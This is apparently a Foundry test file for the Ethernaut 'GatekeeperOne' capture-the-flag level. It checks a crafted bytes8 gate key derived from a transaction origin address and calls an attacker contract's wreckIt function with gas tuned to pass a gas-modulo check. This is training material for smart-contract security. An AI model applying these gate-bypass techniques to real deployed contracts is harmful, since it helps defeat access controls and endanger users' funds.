pragma solidity ^0.8.0;

import "../contracts/Trespasser1.sol";
import "../contracts/GatekeeperOne.sol";
import "forge-std/Test.sol";

contract Trespasser1Test is Test {
    GatekeeperOne gatekeeper;
    Trespasser1 trespasser;

    function setUp() public {
        // trespasser = new Trespasser1(0x2F2f628d4dBc8D94eAA1DEC76FC24FDf552D7cD5);
        gatekeeper = new GatekeeperOne();
        trespasser = new Trespasser1(address(gatekeeper));
    }

    function testGateKey() public {
      address origin = 0x58890A9cB27586E83Cb51d2d26bbE18a1a647245;
      bytes8 gateKey = bytes8(0x26bbE18a00007245);

      assertEq(uint32(uint64(gateKey)), uint16(uint64(gateKey)));
      if (uint32(uint64(gateKey)) == uint64(gateKey)) {
        fail();
      }
      assertEq(uint32(uint64(gateKey)), uint16(uint160(origin)));
    }

    function testExploit() public {
      bytes8 gateKey = bytes8(0x26bbE18a00007245);
      uint gasRequired = 81910 - (8191 - 353);
      (bool success, bytes memory data) = address(trespasser).call{gas: gasRequired}(
        abi.encodeWithSignature("wreckIt(bytes8)", gateKey)
      );
    }
}
